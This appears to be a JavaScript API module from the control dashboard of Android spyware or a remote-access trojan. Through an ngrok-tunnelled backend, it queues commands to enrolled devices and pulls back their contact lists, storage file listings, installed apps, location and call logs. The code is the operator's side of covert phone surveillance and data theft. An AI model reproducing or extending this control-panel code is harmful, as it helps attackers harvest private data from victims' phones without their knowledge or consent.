import axios from "axios";
import { Users } from "../utils/store/users";

const BASE_URL = "https://9f6a-39-40-103-125.in.ngrok.io/";
// process.env.REACT_APP_MODE === "server"
//   ? process.env.REACT_APP_API_URL
//   : "https://ad3a-39-40-87-246.in.ngrok.io/";

const apiService = axios.create({
  baseURL: BASE_URL,
});
//  get users list
export const fetchUsers = async () => {
  console.log("fetching users");
  console.log("baseurl:", BASE_URL);
  try {
    const response = await apiService.get("dashboard/users");
    return response?.data?.data;
  } catch (error) {
    alert("Error fetching user list:");
    console.error("Error fetching contact list:(api service)", error);
    // Fallback to dummy data
    return Users;
  }
};

// get user data
export const fetchData = async (userId, command, apiEndpoint, path) => {
  let data = path || null;
  console.log("data:", data);
  const response = await apiService.post("command/add", {
    device_id: userId,
    command: command,
    shell: "None",
    number: "None",
    data: data,
  });
  let cmdKey = response?.data?.command_key;
  console.log("1st api res:", response);
  if (response.status === 200) {
    await new Promise((resolve) => setTimeout(resolve, 4000));
    return fetchListData(userId, apiEndpoint, cmdKey);
  } else {
    throw new Error(`Error fetching ${command}`);
  }
};
// .......................different fetch data functions for different api endpoints.......................
const fetchListData = async (userId, apiEndpoint, cmdKey) => {
  const listResponse = await apiService.get(
    `dashboard/datatypes/${apiEndpoint}/${userId}/${cmdKey}`
  );
  console.log("2nd api res:", listResponse);
  if (listResponse.status === 200) {
    return listResponse.data.data.response;
  } else {
    console.log(`da danna ny log de ${apiEndpoint}`);
    throw new Error(`Error fetching ${apiEndpoint} data`);
  }
};

export const fetchContactList = async (userId) => {
  return await fetchData(userId, "getcontact", "getcontact");
};

export const fetchInternalStorage = async (userId, path) => {
  return await fetchData(userId, "listfile", "listfile", path);
};

export const fetchInstalledApps = async (userId) => {
  return await fetchData(userId, "getapps", "getapps");
};
export const fetchLocationList = async (userId) => {
  return await fetchData(userId, "getlocation", "getlocation");
};

export const fetchCallsList = async (userId) => {
  return await fetchData(userId, "getcalllogs", "getcalllogs");
};

export const fetchCallList = async (userId) => {
  // try {
  //   return await fetchData(userId, "getcall", "getcall");
  // } catch (error) {
  //   console.error("Error fetching call list:", error);
  //   throw error;
  // }
};

export const fetchGPSLocation = async (userId) => {
  // try {
  //   return await fetchData(userId, "getlocation", "getlocation");
  // } catch (error) {
  //   console.error("Error fetching call list:", error);
  //   throw error;
  // }
};
